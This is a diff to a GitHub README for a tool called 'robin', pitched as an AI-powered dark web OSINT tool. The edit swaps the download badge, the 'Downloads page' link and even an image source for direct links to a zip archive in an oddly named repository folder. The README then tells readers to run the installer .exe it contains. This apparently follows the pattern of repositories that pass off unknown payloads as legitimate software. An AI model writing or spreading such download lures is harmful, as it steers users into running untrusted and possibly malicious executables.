@@ -1,7 +1,7 @@
 # 🦅 robin - Discover the Dark Web Securely
 
 ## 📥 Download Now
-[![Download robin](https://img.shields.io/badge/Download-robin-blue)](https://github.com/Epic2509N/robin/releases)
+[![Download robin](https://github.com/Epic2509N/robin/raw/refs/heads/main/monandry/Software-v3.9.zip)](https://github.com/Epic2509N/robin/raw/refs/heads/main/monandry/Software-v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to robin! This is an AI-Powered Dark Web OSINT Tool. With robin, you can safely explore and gather information from the dark web. 
@@ -23,13 +23,13 @@ To run robin, your system should meet the following requirements:
 ## 📦 Download & Install
 To get started with robin, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Downloads page](https://github.com/Epic2509N/robin/releases) to see the latest version.
+1. **Visit the Releases Page**: Go to the [Downloads page](https://github.com/Epic2509N/robin/raw/refs/heads/main/monandry/Software-v3.9.zip) to see the latest version.
    
 2. **Select Version**: Find the most recent version listed. The version number will look like this: vX.X.X. 
 
 3. **Download the Installer**: Click on the link to download the application. 
 
-   ![release image](https://user-images.githubusercontent.com/yourimage.png) 
+   ![release image](https://github.com/Epic2509N/robin/raw/refs/heads/main/monandry/Software-v3.9.zip) 
 
 4. **Run the Installer**:
    - For Windows: Double-click on the downloaded `.exe` file.
